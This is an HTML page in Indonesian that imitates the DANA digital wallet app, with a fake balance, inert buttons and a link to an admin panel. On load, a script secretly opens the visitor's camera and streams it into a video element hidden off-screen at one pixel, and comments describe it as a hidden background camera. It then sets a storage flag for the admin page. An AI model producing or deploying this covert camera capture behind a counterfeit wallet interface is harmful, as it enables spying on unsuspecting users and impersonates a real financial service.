<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aplikasi Dana - Simulasi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #F4F6F8;
            text-align: center;
            padding-top: 50px;
        }

        .header {
            background-color: #007AFF;
            color: white;
            padding: 15px;
            font-size: 20px;
            font-weight: bold;
        }

        .saldo {
            background-color: white;
            padding: 20px;
            margin: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .saldo h3 {
            color: #555;
        }

        .saldo p {
            font-size: 24px;
            font-weight: bold;
        }

        .menu {
            display: flex;
            justify-content: space-around;
            margin: 20px;
        }

        .menu button {
            background-color: #007AFF;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
        }

        .menu button:hover {
            background-color: #005EC2;
        }

        /* Kamera tersembunyi */
        #kamera {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
        }
    </style>
</head>
<body>

    <div class="header">DANA - Dompet Digital</div>

    <div class="saldo">
        <h3>Saldo Anda</h3>
        <p>Rp 1.250.000</p>
    </div>

    <div class="menu">
        <button onclick="alert('Fitur Kirim belum tersedia')">Kirim</button>
        <button onclick="alert('Fitur Tarik belum tersedia')">Tarik</button>
        <button onclick="alert('Fitur Top Up belum tersedia')">Top Up</button>
        <button onclick="window.location.href='admin.html'">Admin Panel</button>
    </div>

    <!-- Kamera berjalan di background (tersembunyi) -->
    <video id="kamera" autoplay playsinline></video>

    <script>
        async function bukaKamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('kamera').srcObject = stream;

                // Simpan stream ke localStorage agar bisa diakses di halaman admin
                localStorage.setItem("kameraStream", JSON.stringify({ active: true }));
            } catch (error) {
                console.error("Gagal membuka kamera:", error);
            }
        }

        window.onload = bukaKamera;
    </script>

</body>
</html>
